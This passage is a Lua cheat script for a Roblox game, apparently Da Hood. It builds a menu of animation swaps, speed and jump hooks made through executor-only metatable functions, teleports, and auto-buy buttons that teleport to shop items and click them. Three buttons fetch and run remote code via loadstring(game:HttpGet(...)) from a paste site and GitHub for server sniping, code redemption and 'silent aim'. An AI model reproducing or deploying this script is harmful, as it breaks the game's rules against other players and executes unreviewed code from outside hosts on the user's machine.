local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921157929"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921229866"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921241244"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

Section:NewButton("real zombie animation", "fake animation", function()
local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

Section:NewButton("animation catuny", "fake animation", function()
local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

Section:NewButton("animation A_Elder", "fake animation", function()
    local Char = game.Players.LocalPlayer.Character
    local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
    
    for i,v in next, Hum:GetPlayingAnimationTracks() do
        v:Stop()
    end
    wait(1)
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end)

Section:NewButton("animation zombie", "fake animation", function()
local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

Section:NewButton("animation ninja", "fake animation", function()
local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

Section:NewButton("no animation (no animation)", "no animation", function()
    local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

local Tab = Window:NewTab("Misc")
local Section = Tab:NewSection("Misc")

Section:NewButton("anti slow", "you won’t be slow when you attack", function()
local mt = getrawmetatable(game)
local backup
backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
if key == "WalkSpeed" and value < 18 then
value = 18
end
return backup(self, key, value)
end))
end)

Section:NewButton("anti auto kill", "anti auto kill", function()
game.Workspace.FallenPartsDestroyHeight = -10000
    local part = Instance.new("Part")
    part.Size = Vector3.new(100, 2, 100)
    part.Name = "AntiAutoKill"
    part.Parent = game.Workspace
    part.Anchored = true
    local pl = game.Players.LocalPlayer.Character
    part.Position = Vector3.new(-897.6600952148438, -650.0717163085938, -709.875732421875)
    pl.HumanoidRootPart.CFrame = part.CFrame
    end)

Section:NewButton("teleport to anti auto kill", "anti auto kill", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-897.6600952148438, -640.0717163085938, -709.875732421875)
end)

Section:NewButton("Rejoin", "ButtonInfo", function()
game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
end)

Section:NewButton("Server Snipe", "Join anyone’s server", function()
loadstring(game:HttpGet("https://freenote.biz/raw/jzTjXcX5dJ"))();
end)

Section:NewButton("become a police/leave", "police", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.workspace.Ignored["Join/Leave"].Head.CFrame
fireclickdetector(game.workspace.Ignored["Join/Leave"].ClickDetector)
end)

Section:NewButton("Redeem codes", "Redeems codes", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cool5013/hub/main/codes"))();
end)

Section:NewButton("Rightclick good for silent aim", "op", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Leftclickballi'))()
end)

Section:NewButton("No Cooldown Jump", "ButtonInfo", function()
--you smell raw beef--
if not game.IsLoaded(game) then
   game.Loaded.Wait(game.Loaded);
end


local IsA = game.IsA;
local newindex = nil


newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
   if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then
       return
   end
   
   return newindex(self, Index, Value);
end)
end)

Section:NewButton("SavePosition", "Locations1", function() 
    _G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
end)
Section:NewButton("LoadPosition", "Locations1", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
end)

local Tab = Window:NewTab("auto buy")
local Section = Tab:NewSection("auto buy")

Section:NewButton("Buy Revolver", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Revolver] - $1339"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Revolver]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Revolver Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["12 [Revolver Ammo] - $77"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Revolver Ammo]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Double-Barrel", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Double-Barrel SG] - $1442"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Double-Barrel SG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Double-Barrel SG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["18 [Double-Barrel SG Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Double-Barrel SG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AUG", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[AUG] - $2421"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AUG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AUG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["90 [AUG Ammo] - $82"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AUG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Shotgun", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1288"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Shotgun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Shotgun Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["20 [Shotgun Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Shotgun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AK47", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[AK47] - $2318"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AK47]"]:Activate()
    wait()
end
end)
Section:NewButton("BUY AK47 Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["90 [AK47 Ammo] - $82"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AK47]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SMG", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[SMG] - $773"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SMG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SMG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["80 [SMG Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SMG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AR", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[AR] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AR]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AR Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["100 [AR Ammo] - $77"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AR]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SilencerAR", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[SilencerAR] - $1288"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SilencerAR]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SilencerAR Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["120 [SilencerAR Ammo] - $77"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SilencerAR]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy LMG", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[LMG] - $3863"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[LMG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy LMG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["200 [LMG Ammo] - $309"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[LMG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy RPG", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[RPG] - $20600"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[RPG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy RPG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["5 [RPG Ammo] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[RPG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Glock", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Glock] - $515"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Glock]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Glock Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["25 [Glock Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Glock]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy TacticalShotgun", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[TacticalShotgun] - $1803"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[TacticalShotgun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy TacticalShotgun Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["20 [TacticalShotgun Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[TacticalShotgun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy P90", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[P90] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[P90]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy P90 Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["120 [P90 Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[P90]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Silencer", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Silencer] - $567"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Silencer]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Silencer Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["25 [Silencer Ammo] - $52"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Silencer]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Money Gun", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Money Gun] - $800"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Money Gun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Popcorn", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Popcorn] - $7"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Popcorn]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy HotDog", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[HotDog] - $8"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[HotDog]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Knife", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Knife] - $155"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Knife]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Key", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Key] - $129"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Key]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Taser", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Taser] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Taser]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Nunchucks", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Nunchucks] - $464"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Nunchucks]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Lockpick", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[LockPicker] - $129"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[LockPicker]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Heavy Weights", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[HeavyWeights] - $258"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[HeavyWeights]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Weights", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Weights] - $124"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Weights]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Lettuce", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Lettuce]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flashlight", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Flashlight] - $10"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flashlight]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Surgeon Mask", "ButtonInfo", function()
if not game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask") then
            local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
                     local Brokie = game.Workspace.Ignored.Shop["[Surgeon Mask] - $27"]
                     game.Players.LocalPlayer.Character:MoveTo(Brokie.Head.Position)
                     wait(0.25)
                     fireclickdetector(Brokie.ClickDetector)
                     wait(0.25)
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savepos)
                 wait(.25)
             local surg = game.Players.LocalPlayer.Backpack:FindFirstChild("[Mask]")
              surg.Parent = game.Players.LocalPlayer.Character
              local New = game.Players.LocalPlayer.Character:FindFirstChild("[Mask]")
               New:Activate()
               New.Parent = game.Players.LocalPlayer.Backpack
          end
         end)

Section:NewButton("Buy armor", "ButtonInfo", function()
local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
             local Brokie = game.workspace.Ignored.Shop["[Medium Armor] - $1697"]
             game.Players.LocalPlayer.Character:MoveTo(Brokie.Head.Position)
             wait(0.25)
             fireclickdetector(Brokie.ClickDetector)
             wait(0.25)
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savepos)
end)

Section:NewButton("Buy Medium Armor", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Medium Armor]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy High-Medium Armor", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[High-Medium Armor] - $2163"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[High-Medium Armor]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Fire Armor", "ButtonInfo", function()
local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
             local Brokie = game.workspace.Ignored.Shop["[Fire Armor] - $2493"]
             game.Players.LocalPlayer.Character:MoveTo(Brokie.Head.Position)
             wait(0.25)
             fireclickdetector(Brokie.ClickDetector)
             wait(0.25)
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savepos)
end)

Section:NewButton("Buy TearGas", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[TearGas] - $5150"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[TearGas]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Grenade", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Grenade] - $721"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Grenade]"]:Activate()
